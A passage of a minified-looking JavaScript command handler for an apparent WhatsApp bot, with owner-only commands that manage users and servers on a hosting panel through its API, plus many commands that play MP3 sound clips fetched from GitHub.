          if (!_0x585723) {
            return _0x25b16a("*This feature can only be used by the owner/Dev*");
          }
          if (!q) {
            return _0x25b16a("ID nya mana?");
          }
          let _0x57e4e0 = await fetch(global.domain + '/api/application/users/' + q, {
            'method': "DELETE",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + global.key_plta
            }
          });
          let _0x37f51c = await _0x57e4e0.json();
          if (_0x37f51c.errors) {
            return _0x25b16a(util.format(_0x37f51c.errors[0x0]));
          }
          _0x25b16a("*SUKSES DELETE USER " + q + '*');
        }
        break;
      case "detusr":
        {
          if (!_0x585723) {
            return _0x25b16a("*This feature can only be used by the owner/Dev*");
          }
          let _0x1a473e = _0x3bedf8[0x0];
          let _0x537e37 = await fetch(global.domain + "/api/application/users/" + _0x1a473e, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_plta
            }
          });
          let _0x42adb6 = await _0x537e37.json();
          if (_0x42adb6.errors) {
            return _0x25b16a(util.format(_0x42adb6.errors[0x0]));
          }
          let _0x52b0fa = _0x42adb6.attributes;
          let _0x24b759 = "▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n" + _0x52b0fa.username.toUpperCase() + " USER DETAILS\n\nID: " + _0x52b0fa.id + "\nUSERNAME: " + _0x52b0fa.username + "\nLANGUAGE: " + _0x52b0fa.language + "\nADMIN: " + _0x52b0fa.root_admin + "\nEMAIL: " + _0x52b0fa.email + "\nCREATED AT: \n " + _0x52b0fa.created_at + "\n▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬";
          _0x25b16a(_0x24b759);
        }
        break;
      case "listusr":
        {
          if (!_0x585723) {
            return _0x25b16a("*This feature can only be used by the owner/Dev*");
          }
          let _0x351719 = q ? q : '1';
          let _0x4d2ec2 = await fetch(global.domain + "/api/application/users?page=" + _0x351719, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_plta
            }
          });
          let _0x365308 = await _0x4d2ec2.json();
          if (_0x365308.errors) {
            return _0x25b16a(util.format(_0x365308.errors[0x0]));
          }
          let _0x54d415 = _0x365308.data;
          let _0x5c8ee6 = [];
          for (let _0x37917d of _0x54d415) {
            let _0x4fb40a = _0x37917d.attributes;
            let _0x3cb539 = {
              'id': _0x4fb40a.id,
              'username': _0x4fb40a.username,
              'email': _0x4fb40a.email,
              'language': _0x4fb40a.language,
              'root_admin': _0x4fb40a.root_admin
            };
            await _0x5c8ee6.push(_0x3cb539);
          }
          _0x13a24e(util.format(_0x5c8ee6));
        }
        break;
      case "addsrv":
        {
          if (!_0x585723) {
            return _0x25b16a("*This feature can only be used by the owner/Dev*");
          }
          let _0x549c1f = q.split(',');
          if (_0x549c1f.length < 0x5) {
            return _0x25b16a("username,deskripsi,userID,ram/disk,cpu");
          }
          let _0x1a919b = _0x549c1f[0x0];
          let _0x3c26fa = _0x549c1f[0x1] || " ";
          let _0x47f3a9 = _0x549c1f[0x2];
          let _0x4526c0 = _0x549c1f[0x3].split`/`;
          let _0x2eecac = _0x549c1f[0x4];
          let _0x326656 = global.eggID;
          let _0x4c5737 = global.locID;
          let _0x23ddb9 = await fetch(domain + '/api/application/servers', {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_plta
            },
            'body': JSON.stringify({
              'name': _0x1a919b,
              'description': _0x3c26fa,
              'user': _0x47f3a9,
              'egg': parseInt(_0x326656),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_21",
              'startup': "${CMD_RUN}",
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': _0x4526c0[0x0],
                'swap': 0x0,
                'disk': _0x4526c0[0x1],
                'io': 0x1f4,
                'cpu': _0x2eecac
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x5
              },
              'deploy': {
                'locations': [parseInt(_0x4c5737)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x16845f = await _0x23ddb9.json();
          if (_0x16845f.errors) {
            return _0x25b16a(util.format(_0x16845f.errors[0x0]));
          }
          let _0x4dec5a = _0x16845f.attributes;
          let _0xb0551a = "𝗦𝗨𝗞𝗦𝗘𝗦 𝗠𝗘𝗠𝗕𝗨𝗔𝗧 𝗦𝗘𝗥𝗩𝗘𝗥\n\nID: " + _0x4dec5a.id + "\nTYPE: " + _0x16845f.object + "\nNAME: " + _0x4dec5a.name + "\nMEMORY: " + (_0x4dec5a.limits.memory === 0x0 ? "unlimited" : _0x4dec5a.limits.memory) + " MB\nDISK: " + (_0x4dec5a.limits.disk === 0x0 ? "unlimited" : _0x4dec5a.limits.disk) + " MB\nCPU: " + (_0x4dec5a.limits.cpu === 0x0 ? "unlimited" : _0x4dec5a.limits.cpu) + "%\nEXPIRED: 1 BULAN\nDESCRIPTION: " + _0x4dec5a.description + "\nCREATED AT: \n" + _0x4dec5a.created_at + "\n";
          _0x13a24e(_0xb0551a);
        }
        break;
      case "delsrv":
        {
          if (!_0x585723) {
            return _0x25b16a("*This feature can only be used by the owner/Dev*");
          }
          if (!q) {
            return _0x25b16a("Server nomor berapa yang mau di hapus?\nContoh: delsrv 1");
          }
          let _0x217076 = await fetch(global.domain + "/api/application/servers/" + q, {
            'method': "DELETE",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + global.key_plta
            }
          });
          let _0x1e6825 = await _0x217076.json();
          if (_0x1e6825.errors) {
            return _0x25b16a(util.format(_0x1e6825.errors[0x0]));
          }
          _0x25b16a("SUKSES DELETE SERVER " + q);
        }
        break;
      case "reinstall":
        {
          if (!_0x585723) {
            return _0x25b16a("*This feature can only be used by the owner/Dev*");
          }
          if (!q) {
            return _0x25b16a("ID nya mana?");
          }
          let _0x400c2e = await fetch(global.domain + "/api/application/servers/" + q + "/reinstall", {
            'method': 'POST',
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_plta
            }
          });
          let _0x270d6a = await _0x400c2e.json();
          if (_0x270d6a.errors) {
            return _0x25b16a(util.format(_0x270d6a.errors[0x0]));
          }
          _0x25b16a("*SUKSES REINSTALL SERVER " + q + '*');
        }
        break;
      case "bansrv":
        {
          if (!_0x585723) {
            return _0x25b16a("Maaf This feature can only be used by the owner Lexxy");
          }
          if (!q) {
            return _0x25b16a("ID nya mana?");
          }
          let _0x25dc7c = await fetch(global.domain + "/api/application/servers/" + q + "/suspend", {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_plta
            }
          });
          let _0x352c00 = await _0x25dc7c.json();
          if (_0x352c00.errors) {
            return _0x25b16a(util.format(_0x352c00.errors[0x0]));
          }
          _0x25b16a("*SUKSES BANNED SERVER " + q + '*');
        }
        break;
      case "unbansrv":
        {
          if (!_0x585723) {
            return _0x25b16a("Maaf This feature can only be used by the owner Lexxy");
          }
          let _0x58f5a4 = _0x3bedf8[0x0];
          if (!_0x58f5a4) {
            return _0x25b16a("ID nya mana?");
          }
          let _0x5f2cc2 = await fetch(global.domain + '/api/application/servers/' + _0x58f5a4 + "/unsuspend", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_plta
            }
          });
          let _0x50586f = await _0x5f2cc2.json();
          if (_0x50586f.errors) {
            return _0x25b16a(util.format(_0x50586f.errors[0x0]));
          }
          _0x25b16a("*SUKSES UNBAND SERVER " + _0x58f5a4 + '*');
        }
        break;
      case "detsrv":
        {
          if (!_0x585723) {
            return _0x25b16a("*This feature can only be used by the owner/Dev*");
          }
          let _0x32c0b2 = await fetch(global.domain + "/api/application/servers/" + q, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_plta
            }
          });
          let _0x159c5f = await _0x32c0b2.json();
          if (_0x159c5f.errors) {
            return _0x25b16a(util.format(_0x159c5f.errors[0x0]));
          }
          let _0x4ce7ee = _0x159c5f.attributes;
          let _0x3d80fc = "▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n" + _0x4ce7ee.name.toUpperCase() + " SERVER DETAILS\n\n● ID: " + _0x4ce7ee.id + "\n● NAME: " + _0x4ce7ee.name + "\n● MEMORY: " + (_0x4ce7ee.limits.memory === 0x0 ? "Unlimited MB" : _0x4ce7ee.limits.memory + 'MB') + "\n● DISK: " + (_0x4ce7ee.limits.disk === 0x0 ? "Unlimited MB" : _0x4ce7ee.limits.disk + 'MB') + "\n● CPU: " + (_0x4ce7ee.limits.cpu === 0x0 ? "Unlimited %" : _0x4ce7ee.limits.cpu + '%') + "\n● DESKRIPSI: " + _0x4ce7ee.description + "\n● CREATED AT: \n " + _0x4ce7ee.created_at + "\n ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬";
          _0x25b16a(_0x3d80fc);
        }
        break;
      case "listsrv":
        {
          if (!_0x585723) {
            return _0x25b16a("*This feature can only be used by the owner/Dev*");
          }
          let _0x37c73e = q ? q : '1';
          let _0x5a8998 = await fetch(global.domain + "/api/application/servers?page=" + _0x37c73e, {
            'method': "GET",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_plta
            }
          });
          let _0x339040 = await _0x5a8998.json();
          if (_0x339040.errors) {
            return _0x25b16a(util.format(_0x339040.errors[0x0]));
          }
          let _0x4900ad = _0x339040.data;
          let _0x58f370 = [];
          for (let _0x1a2318 of _0x4900ad) {
            let _0x33ff2a = _0x1a2318.attributes;
            let _0x7616 = {
              'id': _0x33ff2a.id,
              'name': _0x33ff2a.name.toLowerCase(),
              'memory': _0x33ff2a.limits.memory,
              'disk': _0x33ff2a.limits.disk,
              'cpu': _0x33ff2a.limits.cpu
            };
            await _0x58f370.push(_0x7616);
          }
          _0x25b16a(util.format(_0x58f370));
        }
        break;
      case "sound1":
      case 'sound2':
      case 'sound3':
      case "sound4":
      case "sound5":
      case "sound6":
      case "sound7":
      case "sound8":
      case "sound9":
      case "sound10":
      case "sound11":
      case "sound12":
      case 'sound13':
      case "sound14":
      case "sound15":
      case "sound16":
      case "sound17":
      case "sound18":
      case 'sound19':
      case "sound20":
      case "sound21":
      case "sound22":
      case 'sound23':
      case "sound24":
      case "sound25":
      case "sound26":
      case "sound27":
      case "sound28":
      case 'sound29':
      case "sound30":
      case 'sound31':
      case "sound32":
      case "sound33":
      case "sound34":
      case "sound35":
      case "sound36":
      case "sound37":
      case "sound38":
      case "sound39":
      case "sound40":
      case 'sound41':
      case "sound42":
      case "sound43":
      case "sound44":
      case "sound45":
      case "sound46":
      case "sound47":
      case "sound48":
      case "sound49":
      case "sound50":
      case "sound51":
      case "sound52":
      case "sound53":
      case "sound54":
      case 'sound55':
      case 'sound56':
      case "sound57":
      case 'sound58':
      case 'sound59':
      case 'sound60':
      case "sound61":
      case "sound62":
      case "sound63":
      case "sound64":
      case "sound65":
      case 'sound66':
      case "sound67":
      case "sound68":
      case "sound69":
      case 'sound70':
      case "sound71":
      case "sound72":
      case "sound73":
      case "sound74":
      case "sound75":
      case "sound76":
      case 'sound77':
      case 'sound78':
      case 'sound79':
      case 'sound80':
      case "sound81":
      case "sound82":
      case "sound83":
      case "sound84":
      case "sound85":
      case "sound86":
      case "sound87":
      case "sound88":
      case 'sound89':
      case "sound90":
      case "sound91":
      case "sound92":
      case "sound93":
      case "sound94":
      case "sound95":
      case "sound96":
      case "sound97":
      case "sound98":
      case "sound99":
      case 'sound100':
      case "sound101":
      case "sound102":
      case "sound103":
      case "sound104":
      case 'sound105':
      case "sound106":
      case "sound107":
      case 'sound108':
      case "sound109":
      case 'sound110':
      case 'sound111':
      case "sound112":
      case "sound113":
      case "sound114":
      case 'sound115':
      case "sound116":
      case "sound117":
      case "sound118":
      case 'sound119':
      case "sound120":
      case "sound121":
      case "sound122":
      case "sound123":
      case "sound124":
      case 'sound125':
      case "sound126":
      case "sound127":
      case 'sound128':
      case "sound129":
      case "sound130":
      case "sound131":
      case 'sound132':
      case 'sound133':
      case "sound134":
      case 'sound135':
      case "sound136":
      case "sound137":
      case 'sound138':
      case "sound139":
      case "sound140":
      case "sound141":
      case "sound142":
      case "sound143":
      case 'sound144':
      case "sound145":
      case 'sound146':
      case "sound147":
      case "sound148":
      case "sound149":
      case "sound150":
      case "sound151":
      case "sound152":
      case 'sound153':
      case "sound154":
      case 'sound155':
      case "sound156":
      case "sound157":
      case "sound158":
      case "sound159":
      case "sound160":
      case "sound161":
        {
          if (!_0x585723 && !_0x5290c9 && !_0x3424fb && !_0x1eaf88) {
            return;
          }
          strava_dev = await getBuffer("https://github.com/Lexxy24/MusicTikTok-Api/raw/master/tiktokmusic/" + _0x2818bf + ".mp3");
          _0x23b255.sendMessage(_0x42fa35, {
            'audio': strava_dev,
            'mimetype': "audio/mp4",
            'ptt': true
          }, {
            'quoted': _0x38267e
          });
        }
        break;
      default:
    }
  } catch (_0x3af1df) {
    froom = _0x38267e.key.remoteJid;
    stravaRorr = async () => {
      _0x23b255.sendMessage(froom, {
        'text': util.format(_0x3af1df)
      });
    };
    stravaRorr();
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});